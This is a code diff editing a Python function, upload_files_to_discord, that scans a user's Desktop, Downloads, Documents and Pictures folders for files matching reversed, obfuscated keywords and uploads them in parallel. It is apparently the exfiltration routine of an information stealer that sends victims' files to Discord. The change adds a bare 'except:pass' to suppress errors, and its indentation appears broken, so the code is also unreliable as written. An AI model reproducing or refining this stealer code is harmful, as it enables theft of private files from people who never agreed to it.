@@ -814,37 +814,31 @@ def upload_files_to_discord():
     downloads_path = os.path.expanduser("~/Downloads")
     documents_path = os.path.expanduser("~/Documents")
     pictures_path = os.path.expanduser("~/Pictures")
-    music_path = os.path.expanduser("~/Music")
-    videos_path = os.path.expanduser("~/Videos")
-    applications_path = os.path.expanduser("~/Applications")
-    public_path = os.path.expanduser("~/Public")
-    templates_path = os.path.expanduser("~/Templates")
-    downloads_documents_path = os.path.join(downloads_path, "Documents")
-    downloads_pictures_path = os.path.join(downloads_path, "Pictures")
 
     file_paths = []
-
-    for path in [desktop_path, downloads_path, documents_path, pictures_path]:
-        for file in os.listdir(path):
-            if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
-                file_path = os.path.join(path, file) 
-                file_paths.append(file_path)
-
-    urls = []
-
-    with concurrent.futures.ThreadPoolExecutor() as executor:
-        futures = []
-        try:
-            for file_path in file_paths:
-                futures.append(executor.submit(upload_file, file_path))
-            for future, file_path in zip(futures, file_paths):
-                url = future.result()
-                if url:
-                    urls.append((os.path.basename(file_path), url))
-                else:
-                    pass
-        finally:
-            executor.shutdown(wait=True)
+    try:
+        for path in [desktop_path, downloads_path, documents_path, pictures_path]:
+            for file in os.listdir(path):
+                if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
+                    file_path = os.path.join(path, file) 
+                    file_paths.append(file_path)
+    
+        urls = []
+    
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            futures = []
+            try:
+                for file_path in file_paths:
+                    futures.append(executor.submit(upload_file, file_path))
+                for future, file_path in zip(futures, file_paths):
+                    url = future.result()
+                    if url:
+                        urls.append((os.path.basename(file_path), url))
+                    else:
+                        pass
+            finally:
+                executor.shutdown(wait=True)
+        except:pass
 
 
     if urls:
